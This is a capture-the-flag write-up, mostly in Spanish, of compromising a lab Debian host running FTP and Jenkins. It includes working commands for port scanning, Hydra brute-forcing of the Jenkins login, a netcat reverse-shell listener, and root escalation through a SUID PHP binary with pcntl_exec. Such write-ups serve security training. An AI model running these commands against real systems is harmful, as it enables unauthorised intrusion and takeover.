# 🏴‍☠️ Writeup CTF: Target 192.168.0.104 (Debian Servidor)

Documentación técnica del proceso de intrusión, escalada de privilegios y compromiso total de la infraestructura basada en la máquina objetivo `192.168.0.104`.

---

## 🗺️ Phase 1: Reconnaissance & Port Scanning

Ejecución de un escaneo táctico `SYN Stealth Scan` abarcando todo el rango de puertos (`65535`) para mapear la superficie de ataque expuesta.

```bash
sudo nmap -p- -sS -Pn 192.168.0.104
```

### 🔍 Open Ports Filtered
* **Port 21/tcp**: FTP (ProFTPD)
* **Port 22/tcp**: SSH (OpenSSH 9.2p1 Debian)
* **Port 80/tcp**: HTTP (Apache httpd 2.4.59)
* **Port 8080/tcp**: HTTP (Jetty 10.0.20 / Jenkins Service)

---

## 🔓 Phase 2: Enumeration & Information Gathering

Se realizó una inspección profunda de servicios para identificar versiones y configuraciones inseguras.

```bash
nmap -p 21,22,80,8080 -sCV 192.168.0.104
```

### 🐧 FTP Anonymous Infiltration
El puerto `21` permitía autenticación anónima (`Anonymous FTP login allowed`). Nos infiltramos para extraer vectores de información.

```bash
ftp -a 192.168.0.104
ftp> ls
ftp> mget ayuda.txt
```

#### 📄 Data Leak (ayuda.txt):
El archivo expuesto contenía credenciales implícitas y un caso de uso para ingeniería social / fuerza bruta:
* **Usuario identificado**: `geralt`
* **Target del servicio**: Jenkins (corriendo en el puerto 8080)
* **Patrón de contraseña**: 5 caracteres, máscara fija `p@@@a` (comienza con 'p', termina con 'a').

---

## 🔨 Phase 3: Weaponization & Exploit

### 📊 Wordlist Crafting
Utilizamos `Crunch` para generar un diccionario optimizado aplicando la máscara obtenida, reduciendo drásticamente el espacio de búsqueda a **17,576 líneas**.

```bash
crunch 5 5 -t p@@@a -o diccionario.txt
```

### 🚀 Brute Force Attack via Hydra
Con el diccionario listo, lanzamos un ataque de fuerza bruta dirigido al endpoint de autenticación de Spring Security en Jetty.

```bash
hydra -l geralt -P diccionario.txt 192.168.0.104 -s 8080 http-post-form "/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=:Invalid username or password" -f -V
```

* **🔑 Credencial Comprometida**: `geralt` : `panda`

```text
http://192.168.0.104:8080/manage/script
```


### 🐚 Reverse Shell Trigger
Tras autenticarnos en la consola del servicio, logramos la ejecución remota de comandos (RCE) para forzar un callback hacia nuestra estación de escucha.

```bash
# En máquina atacante:
nc -lvp 4444
```
* **Conexión entrante establecida**: Shell reversa interactiva como el usuario de servicio.

---

## ⚡ Phase 4: Privilege Escalation (PrivEsc)

Una vez dentro del sistema, ejecutamos un escaneo de binarios con el bit `SUID` activo para detectar vectores de elevación de privilegios.

```bash
find / -perm -4000 -ls 2>/dev/null
```

### 🛑 SUID Flaw Identified
Entre los binarios estándar, detectamos una desviación crítica de seguridad: **PHP 8.2 configurado con permisos SUID de root**.

```text
-rwsr-xr-x   1 root     root      5654232 abr 12  2024 /usr/bin/php8.2
```

### 💀 Root Compromise Execution
Explotamos el binario `php8.2` llamando a la función `pcntl_exec` para saltar las restricciones del sistema y spawnear una shell nativa con UID 0 (Root), manteniendo los privilegios heredados por el bit SUID (`-p`).

```bash
/usr/bin/php8.2 -r "pcntl_exec('/bin/sh', ['-p']);"
```

```bash
whoami
> root
```

---

## 🏆 Loot & Proof of Compromise

Navegamos con éxito al directorio personal del administrador supremo para recolectar la prueba final del compromiso.

```bash
cd /root
ls
cat root.txt
```

**PWNED! 💀**
